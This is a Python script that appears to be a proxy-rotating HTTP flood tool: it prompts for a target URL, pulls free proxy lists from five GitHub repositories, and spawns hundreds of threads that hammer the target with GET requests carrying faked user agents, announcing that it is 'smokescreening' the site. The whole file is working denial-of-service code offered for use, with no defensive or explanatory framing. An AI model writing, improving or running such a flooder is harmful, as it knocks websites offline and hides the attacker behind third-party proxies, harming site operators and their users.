import requests;from requests import get
import time
from urllib import request as urlrequest 
from itertools import cycle
import traceback
import threading;from threading import Thread
from colorama import init;init();from colorama import Fore, Back, Style



print(Fore.BLUE, Style.BRIGHT, Back.BLACK+"""

    __        _       ___  __   _  __  ___ ___      
   (_ ` )\/) / ) )_/  )_  (_ ` / ` )_) )_  )_  )\ ) 
- .__) (  ( (_/ /  ) (__ .__) (_. / \ (__ (__ (  (  - 
                                                  
  """)
print(Fore.WHITE)

targ = input("URL: ")
time.sleep(1)
print("\n[NOTE]: It may take some time to set up proxy connections ... ")


def http():

    

    from faker import Faker
    import time
    fake = Faker()

   

    headers = {'User-Agent': fake.user_agent(),}

   
    

    proxies = 'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt'
    proxies = requests.get(proxies).text
    proxies = proxies.splitlines()

    for proxies in proxies:
        proxies = "http://"+proxies
        list_proxy = [proxies]
        proxy_cycle = cycle(list_proxy)
        proxy = next(proxy_cycle)
        for i in range(1):
            proxy = next(proxy_cycle)
            proxies = {"http": proxy,"https":proxy}
            try:
                r = requests.get(url=targ, proxies=proxies,headers=headers).text
                print(" ",proxy," ===> [REQUESTED]")
            except Exception as E:
                #print(E)
                pass
    

def http2():

    from faker import Faker
    import time
    fake = Faker()

    headers = {'User-Agent': fake.user_agent(),}


    proxies = 'https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt'
    proxies = requests.get(proxies).text
    proxies = proxies.splitlines()

    for proxies in proxies:
        proxies = "http://"+proxies
        list_proxy = [proxies]
        proxy_cycle = cycle(list_proxy)
        proxy = next(proxy_cycle)
        for i in range(1):
            proxy = next(proxy_cycle)
            proxies = {"http": proxy,"https":proxy}
            try:
                r = requests.get(url=targ, proxies=proxies,headers=headers).text
                print(" ",proxy," ===> [REQUESTED]")
            except Exception as E:
                #print(E)
                pass
        

def http3():
    from faker import Faker
    import time
    fake = Faker()

    headers = {'User-Agent': fake.user_agent(),}


    proxies = 'https://raw.githubusercontent.com/rx443/proxy-list/main/online/all.txt'
    proxies = requests.get(proxies).text
    proxies = proxies.splitlines()

    for proxies in proxies:
        proxies = "http://"+proxies
        list_proxy = [proxies]
        proxy_cycle = cycle(list_proxy)
        proxy = next(proxy_cycle)
        for i in range(1):
            proxy = next(proxy_cycle)
            proxies = {"http": proxy,"https":proxy}
            try:
                r = requests.get(url=targ, proxies=proxies,headers=headers).text
                print(" ",proxy," ===> [REQUESTED]")
            except Exception as E:
                #print(E)
                pass
       
def http4():
    
    from faker import Faker
    import time
    fake = Faker()

    headers = {'User-Agent': fake.user_agent(),}


    proxies = 'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt'
    proxies = requests.get(proxies).text
    proxies = proxies.splitlines()

    for proxies in proxies:
        proxies = "http://"+proxies
        list_proxy = [proxies]
        proxy_cycle = cycle(list_proxy)
        proxy = next(proxy_cycle)
        for i in range(1):
            proxy = next(proxy_cycle)
            proxies = {"http": proxy,"https":proxy}
            try:
                r = requests.get(url=targ, proxies=proxies,headers=headers).text
                print(" ",proxy," ===> [REQUESTED]")
            except Exception as E:
                #print(E)
                pass    
    
def http5():

    from faker import Faker
    import time
    fake = Faker()

    headers = {'User-Agent': fake.user_agent(),}


    proxies = 'https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt'
    proxies = requests.get(proxies).text
    proxies = proxies.splitlines()

    for proxies in proxies:
        proxies = "http://"+proxies
        list_proxy = [proxies]
        proxy_cycle = cycle(list_proxy)
        proxy = next(proxy_cycle)
        for i in range(1):
            proxy = next(proxy_cycle)
            proxies = {"http": proxy,"https":proxy}
            try:
                r = requests.get(url=targ, proxies=proxies,headers=headers).text
                print(" ",proxy," ===> [REQUESTED]")
            except Exception as E:
                #print(E)
                pass    
       


def smoke():
    time.sleep(25)
    print("\n[NOTE] Now smokescreening: ",targ)

smoke = threading.Thread(target=smoke)
smoke.start()

for i in range(99):
    try:
        
        a = threading.Thread(target=http)
        b = threading.Thread(target=http2)
        c = threading.Thread(target=http3)
        d = threading.Thread(target=http4)
        e = threading.Thread(target=http5)

        a.start()
        b.start()
        c.start()
        d.start()
        e.start()
        
    except Exception as E:
        #print(E)
        pass



